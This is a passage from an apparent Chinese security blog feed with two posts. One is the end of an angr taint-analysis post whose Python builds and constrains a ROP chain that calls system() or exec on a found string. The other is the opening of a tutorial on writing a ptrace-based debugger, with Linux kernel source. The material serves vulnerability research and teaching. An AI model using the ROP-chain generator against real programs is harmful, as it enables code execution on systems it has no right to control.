boolean">None</span>    ret_string <span class="token operator">=</span> <span class="token boolean">None</span>    <span class="token triple-quoted-string string">"""    angr can find these functions using the loader reference    p.loader, however we'll need to use pwntools for the rop    chain generation anyways, so we'll just stick with pwntools    """</span>    <span class="token keyword">for</span> function <span class="token keyword">in</span> functions<span class="token punctuation">:</span>        <span class="token keyword">if</span> function <span class="token keyword">in</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">:</span>            ret_func <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>function<span class="token punctuation">]</span>            <span class="token keyword">break</span>        <span class="token keyword">elif</span> function <span class="token keyword">in</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">:</span>            ret_func <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span>function<span class="token punctuation">]</span>            <span class="token keyword">break</span>    <span class="token comment"># Find the string we want to pass it</span>    <span class="token keyword">for</span> string <span class="token keyword">in</span> strings<span class="token punctuation">:</span>        str_occurences <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>elf<span class="token punctuation">.</span>search<span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> str_occurences<span class="token punctuation">:</span>            ret_string <span class="token operator">=</span> str_occurences<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> ret_func<span class="token punctuation">:</span>        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"Cannot find symbol to return to"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> ret_string<span class="token punctuation">:</span>        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"Cannot find string to pass to system or exec call"</span><span class="token punctuation">)</span>    <span class="token comment"># movabs fix</span>    <span class="token triple-quoted-string string">"""    During amd64 ropchaining, there is sometimes a stack alignment    issue that folks call the `movabs` issue inside of a system()    call.Adding a single rop-ret gadget here fixes that.    """</span>    rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>ret<span class="token punctuation">.</span>address<span class="token punctuation">)</span>    <span class="token triple-quoted-string string">"""    The pwntools interface is nice enough to enable us to construct    our chain with a rop.call function here.    """</span>    rop<span class="token punctuation">.</span>call<span class="token punctuation">(</span>ret_func<span class="token punctuation">,</span> <span class="token punctuation">[</span>ret_string<span class="token punctuation">]</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"rop chain gadgets and values:\n{}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>rop<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token triple-quoted-string string">"""    We need both the generated chain and gadget addresses for when    we contrain theprogram state to execute and constrain this chain,    so we pass back both the rop tools refernce along with the chain.    """</span>    <span class="token keyword">return</span> rop<span class="token punctuation">,</span> rop<span class="token punctuation">.</span>build<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过上述的方法可以实现对于rop chain的创建，但是还需要对其进行约束处理和模拟验证。</p><p>​        当我们的rop chain使用一个目标中存在的func的时候会有一个问题，因为angr在模拟执行的时候使用的是SimProcedures来提升速度和精确度而不是直接使用 real func，当模拟的过程中遇到procedures那么rop调用链就会被打破，因为没有跳转到real func上面，所以当我们步入procedures的时候直接设置pc指针到对应的real func。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> new_state<span class="token punctuation">.</span>satisfiable<span class="token punctuation">(</span>extra_constraints<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">[</span>new_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>pc <span class="token operator">==</span> gadget<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    For the actual ROP gadgets, we're stepping through them    until we hit an unconstrained value - We did a `ret` back    onto the symbolic stack.    This process is slower than just setting the whole stack    to the chain, but in testing it seems to work more reliably    """</span>    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"Setting PC to {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>gadget<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    new_state<span class="token punctuation">.</span>add_constraints<span class="token punctuation">(</span>new_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>pc <span class="token operator">==</span> gadget<span class="token punctuation">)</span>    <span class="token triple-quoted-string string">"""    Since we're emulating the program's execution with angr we    will run into an issue when executing any symbols. Where a    SimProcedure will get executed instead of the real function,    which then gives us the wrong constraints/execution for our    rop_chain    """</span>    <span class="token keyword">if</span> gadget <span class="token keyword">in</span> elf_symbol_addrs<span class="token punctuation">:</span>        log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>            <span class="token string">"gadget is hooked symbol, contraining to real address, but calling SimProc"</span>        <span class="token punctuation">)</span>        symbol <span class="token operator">=</span> <span class="token punctuation">[</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> gadget <span class="token operator">==</span> x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        p <span class="token operator">=</span> new_state<span class="token punctuation">.</span>project        new_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>pc <span class="token operator">=</span> p<span class="token punctuation">.</span>loader<span class="token punctuation">.</span>find_symbol<span class="token punctuation">(</span>symbol<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rebased_addr    <span class="token triple-quoted-string string">"""    There is no point in letting our last gadget run, we have all    the constraints on our input to trigger the leak    """</span>    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>rop_chain<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token triple-quoted-string string">"""    Since we're stepping through a ROP chain, VEX IR wants to    try and lift the whole block and emulate a whole block step    this will break what we're trying to do, so we need to    tell it to try and emulate single-step execution as closely    as we can with the opt_level=0        """</span>    rop_simgr <span class="token operator">=</span> new_state<span class="token punctuation">.</span>project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>new_state<span class="token punctuation">)</span>    rop_simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>opt_level<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>    new_state <span class="token operator">=</span> rop_simgr<span class="token punctuation">.</span>unconstrained<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是在rop chain里面存在很多对于堆栈和寄存器的数据设置，因此这个时候需要根据rop chain的内容设置期待的约束：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""Case 2: We're setting a register to an expected popped valueUsually for 64bit rop chains, we're passing values intothe argument registers like RDI."""</span>next_reg <span class="token operator">=</span> curr_rop<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>debug<span class="token punctuation">(</span><span class="token string">"Setting register : {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>next_reg<span class="token punctuation">)</span><span class="token punctuation">)</span>gadget_msg <span class="token operator">=</span> gadget<span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>gadget<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gadget_msg <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>gadget<span class="token punctuation">)</span>state_reg <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>new_state<span class="token punctuation">.</span>regs<span class="token punctuation">,</span> next_reg<span class="token punctuation">)</span><span class="token keyword">if</span> state_reg<span class="token punctuation">.</span>symbolic <span class="token keyword">and</span> new_state<span class="token punctuation">.</span>satisfiable<span class="token punctuation">(</span>    extra_constraints<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">[</span>state_reg <span class="token operator">==</span> gadget<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"Setting {} to {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>next_reg<span class="token punctuation">,</span> gadget_msg<span class="token punctuation">)</span><span class="token punctuation">)</span>    new_state<span class="token punctuation">.</span>add_constraints<span class="token punctuation">(</span>state_reg <span class="token operator">==</span> gadget<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    log<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">"unsatisfied on {} -&gt; {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>next_reg<span class="token punctuation">,</span> gadget_msg<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">break</span><span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>curr_rop<span class="token punctuation">.</span>regs<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>    curr_rop <span class="token operator">=</span> <span class="token boolean">None</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="angr符号执行用于漏洞挖掘的推论"><a href="#angr符号执行用于漏洞挖掘的推论" class="headerlink" title="angr符号执行用于漏洞挖掘的推论"></a>angr符号执行用于漏洞挖掘的推论</h3><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>我也是菜逼，如果大佬们有啥好办法，欢迎一起讨论一起进步。</p></blockquote><ol><li>如果只是单单利用step()以期望产生无法约束的状态来进行漏洞挖掘效果非常不稳定，问题的来源可能是在符号执行的过程中，产生的约束导致state异常存在不稳定的情况，同样的约束内有的求解方案可能就不会导致异常，这就可能导致漏洞错过，但是具体原因我还不清楚，后面会继续探索。</li><li>还有一种方法是利用自定义的探索策略，不过好像并不能很好的解决上述问题。</li><li>在实战漏洞挖掘中，笔者在IOT领域进行了实验，angr在整个符号传递过程中，极其容易受到硬件相关函数影响导致符号传播中断，目前也没有很好的方案来解决这个问题，笔者尝试利用推测下一阶段跳转的方法绕过硬件相关函数，但是这还是会导致大范围的不稳定状态出现以及数据流中断问题，如果利用SimProcess来进行angr hook的话，这会导致巨大的工作量，而且还要极大工作量的更新和维护，基本上与自动化的初衷背离。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Angr-Taint-Analysis&quot;&gt;&lt;a href=&quot;#Angr-Taint-Analysis&quot; class=&quot;headerlink&quot; title=&quot;Angr Taint Analysis&quot;&gt;&lt;/a&gt;Angr Taint Analysis&lt;/h1&gt;&lt;bloc</summary>
      
    
    
    
    <category term="漏洞挖掘" scheme="https://rainsec.cn/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    
    <category term="漏洞挖掘" scheme="https://rainsec.cn/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>实现一个简单的调试器</title>
    <link href="https://rainsec.cn/post/%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E8%B0%83%E8%AF%95%E5%99%A8.html"/>
    <id>https://rainsec.cn/post/%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E8%B0%83%E8%AF%95%E5%99%A8.html</id>
    <published>2023-02-23T09:56:45.000Z</published>
    <updated>2023-04-12T02:36:51.335Z</updated>
    
    <content type="html"><![CDATA[<h1 id="实现一个简单的调试器"><a href="#实现一个简单的调试器" class="headerlink" title="实现一个简单的调试器"></a>实现一个简单的调试器</h1><p>​    以经典的GDB为例其项目代码共有十几万行代码，但是很多情况下只会使用到几个常用功能：单步，断点，查看变量，线程/进程切换。而GDB基本上是依赖于<code>ptrace</code>系统调用，主要用于编写调试程序。大部分实现思路参考<a href="https://blog.tartanllama.xyz/writing-a-linux-debugger-breakpoints/">Writing a Linux Debugger Part 2: Breakpoints (tartanllama.xyz)</a>系列文章，强烈推荐阅读</p><p>目标功能：</p><ul><li>单步</li><li>断点</li><li>查看内存/寄存器</li><li>查看汇编</li></ul><h1 id="ptrace-原理"><a href="#ptrace-原理" class="headerlink" title="ptrace 原理"></a>ptrace 原理</h1><p>​    先来看看ptrace系统调用的函数签名：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ptrace.h&gt;</span></span><span class="token keyword">long</span> <span class="token function">ptrace</span><span class="token punctuation">(</span><span class="token keyword">enum</span> <span class="token class-name">__ptrace_request</span> request<span class="token punctuation">,</span> <span class="token class-name">pid_t</span> pid<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>addr<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*DESCRIPTION       The  ptrace()  system  call  provides  a  means  by  which one process (the       "tracer") may observe and control the execution  of  another  process  (the       "tracee"), and examine and change the tracee's memory and registers.  It is       primarily used to implement breakpoint debugging and system call tracing.   即ptrace系统调用提供给tracer控制，读取，修改另一个进程(tracee)的能力，由此可以实现断点和系统调用追踪          A tracee first needs to be attached to the tracer.  Attachment  and  subse‐       quent commands are per thread: in a multithreaded process, every thread can       be individually attached to a (potentially different) tracer, or  left  not       attached  and  thus  not debugged.  Therefore, "tracee" always means "(one)       thread", never "a (possibly multithreaded) process".  Ptrace  commands  are       always sent to a specific tracee using a call of the form       即tracer通过ptrace进行附加(attach)和发送命令都是针对某一个线程的而不是进程*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>request：调试者(<strong>tracer</strong>)要执行的操作，常见的有PTRACE_TRACEME，PTRACE_ATTACH，PTRACE_PEEKUSER，PTRACE_SINGLESTEP等</li><li>pid：被调试进程(<strong>tracee</strong>)pid</li><li>addr：要读写的内存地址</li><li>data：如果要向目标进程写入数据那么data就是我们数据地址；如果要读取目标进程数据那么data就是保留数据的地址</li></ul><p>ptrace系统调用会根据不同的request完成不同功能如：</p><ul><li>PTRACE_TRACEME：表示此进程即将被父进程trace，此时其他参数被忽略</li><li>PTRACE_PEEKTEXT, PTRACE_PEEKDATA：读取tracee在<strong>addr</strong>(虚拟内存空间)处的一个字，返回值就是读取到的字</li><li>PTRACE_PEEKUSER：读取tracee的<strong>USER area</strong>，其包含了该进程的寄存器以及其他信息</li><li>PTRACE_POKETEXT, PTRACE_POKEDATA：复制<strong>data</strong>所指向的一个字到tracee的<strong>addr</strong>(虚拟内存空间)处</li><li>PTRACE_POKEUSER：复制data所指的一个字带tracee的<strong>USER area</strong></li><li>PTRACE_GETREGS, PTRACE_GETFPREGS：复制<strong>tracee</strong>的<code>通用寄存器</code>或者<code>浮点寄存器</code>到<strong>tracer</strong>的<strong>data</strong>所指的位置，addr被忽略</li><li>PTRACE_SETREGS, PTRACE_SETFPREGS：修改tracee的通用寄存器或者浮点寄存器</li><li>PTRACE_CONT：运行被暂停的tracee进程。如果data参数非0那么就表示data是传给tracee的<strong>信号数值</strong></li><li>PTRACE_SYSCALL, PTRACE_SINGLESTEP：运行被暂停的tracee进程就像PTRACE_CONT功能，不同的是PTRACE_SYSCALL表示运行到下一个系统调用(进入或返回)，PTRACE_SINGLESTEP表示仅运行一条指令便停止</li></ul><p>以下是Linux-2.4.16内核的ptrace系统调用内部实现源码：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">asmlinkage <span class="token keyword">int</span> <span class="token function">sys_ptrace</span><span class="token punctuation">(</span><span class="token keyword">long</span> request<span class="token punctuation">,</span> <span class="token keyword">long</span> pid<span class="token punctuation">,</span> <span class="token keyword">long</span> addr<span class="token punctuation">,</span> <span class="token keyword">long</span> data<span class="token punctuation">)</span><span class="token comment">//asmlinkage是指明该函数用堆栈来传递参数</span><span class="token punctuation">{</span><span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token operator">*</span>child<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">user</span> <span class="token operator">*</span> dummy <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token punctuation">,</span> ret<span class="token punctuation">;</span><span class="token function">lock_kernel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ret <span class="token operator">=</span> <span class="token operator">-</span>EPERM<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>request <span class="token operator">==</span> PTRACE_TRACEME<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">/*检查traced状态是否重复*/</span><span class="token comment">/* are we already being traced? */</span><span class="token keyword">if</span> <span class="token punctuation">(</span>current<span class="token operator">-&gt;</span>ptrace <span class="token operator">&amp;</span> PT_PTRACED<span class="token punctuation">)</span><span class="token keyword">goto</span> out<span class="token punctuation">;</span><span class="token comment">/* set the ptrace bit in the process flags. */</span>current<span class="token operator">-&gt;</span>ptrace <span class="token operator">|=</span> PT_PTRACED<span class="token punctuation">;</span><span class="token comment">//current指向当前进程(task_struct)，因此PTRACE_TRACEME将当前进程设置为PT_PTRACED状态(traced)即被trace者(tracee)</span>ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">goto</span> out<span class="token punctuation">;</span><span class="token punctuation">}</span>ret <span class="token operator">=</span> <span class="token operator">-</span>ESRCH<span class="token punctuation">;</span><span class="token function">read_lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>tasklist_lock<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//调度链表上读锁</span>child <span class="token operator">=</span> <span class="token function">find_task_by_pid</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取目标pid进程结构体(task_struct)</span><span class="token keyword">if</span> <span class="token punctuation">(</span>child<span class="token punctuation">)</span><span class="token function">get_task_struct</span><span class="token punctuation">(</span>child<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">read_unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>tasklist_lock<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>child<span class="token punctuation">)</span><span class="token keyword">goto</span> out<span class="token punctuation">;</span>ret <span class="token operator">=</span> <span class="token operator">-</span>EPERM<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">/* you may not mess with init */</span><span class="token keyword">goto</span> out_tsk<span class="token punctuation">;</span><span class="token comment">/*就像gdb有直接启动并调试一个程序和附加一个进程并调试两个功能，也是基于ptrace的PTRACE_ATTACH让目标进程处于traced状态*/</span><span class="token keyword">if</span> <span class="token punctuation">(</span>request <span class="token operator">==</span> PTRACE_ATTACH<span class="token punctuation">)</span> <span class="token punctuation">{</span>ret <span class="token operator">=</span> <span class="token function">ptrace_attach</span><span class="token punctuation">(</span>child<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">goto</span> out_tsk<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">/*这就是ptrace的主体，通过switch case和request完成，这里先了解部分*/</span><span class="token keyword">switch</span> <span class="token punctuation">(</span>request<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">/* when I and D space are separate, these will need to be fixed. */</span>    <span class="token comment">/*PTRACE_PEEKTEXT，PTRACE_PEEKDATA功能相同都是从虚拟地址addr中读取数据到data指针中*/</span><span class="token keyword">case</span> PTRACE_PEEKTEXT<span class="token operator">:</span> <span class="token comment">/* read word at location addr. */</span> <span class="token keyword">case</span> PTRACE_PEEKDATA<span class="token operator">:</span> <span class="token punctuation">{</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> tmp<span class="token punctuation">;</span><span class="token keyword">int</span> copied<span class="token punctuation">;</span>copied <span class="token operator">=</span> <span class="token function">access_process_vm</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>tmp<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ret <span class="token operator">=</span> <span class="token operator">-</span>EIO<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>copied <span class="token operator">!=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">break</span><span class="token punctuation">;</span>ret <span class="token operator">=</span> <span class="token function">put_user</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">/* read the word at location addr in the USER area. */</span>    <span class="token comment">/*可以检查用户态内存区域(USER area),从USER区域中读取一个字节，偏移量为addr*/</span><span class="token keyword">case</span> PTRACE_PEEKUSR<span class="token operator">:</span> <span class="token punctuation">{</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> tmp<span class="token punctuation">;</span>ret <span class="token operator">=</span> <span class="token operator">-</span>EIO<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>addr <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">||</span> addr <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span>     addr <span class="token operator">&gt;</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">user</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">break</span><span class="token punctuation">;</span>tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment">/* Default return condition */</span><span class="token keyword">if</span><span class="token punctuation">(</span>addr <span class="token operator">&lt;</span> FRAME_SIZE<span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">)</span>tmp <span class="token operator">=</span> <span class="token function">getreg</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>addr <span class="token operator">&gt;=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>dummy<span class="token operator">-&gt;</span>u_debugreg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span>   addr <span class="token operator">&lt;=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>dummy<span class="token operator">-&gt;</span>u_debugreg<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>addr <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>dummy<span class="token operator">-&gt;</span>u_debugreg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>addr <span class="token operator">=</span> addr <span class="token operator">&gt;&gt;</span> <span class="token number">2</span><span class="token punctuation">;</span>tmp <span class="token operator">=</span> child<span class="token operator">-&gt;</span>thread<span class="token punctuation">.</span>debugreg<span class="token punctuation">[</span>addr<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span>ret <span class="token operator">=</span> <span class="token function">put_user</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">/* when I and D space are separate, this will have to be fixed. */</span>    <span class="token comment">/*PTRACE_POKETEXT和PTRACE_POKEDATA功能相同都是向虚拟地址addr写入来自data的数据*/</span><span class="token keyword">case</span> PTRACE_POKETEXT<span class="token operator">:</span> <span class="token comment">/* write the word at location addr. */</span><span class="token keyword">case</span> PTRACE_POKEDATA<span class="token operator">:</span>ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">access_process_vm</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>data<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">break</span><span class="token punctuation">;</span>ret <span class="token operator">=</span> <span class="token operator">-</span>EIO<span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> PTRACE_POKEUSR<span class="token operator">:</span> <span class="token comment">/* write the word at location addr in the USER area */</span>ret <span class="token operator">=</span> <span class="token 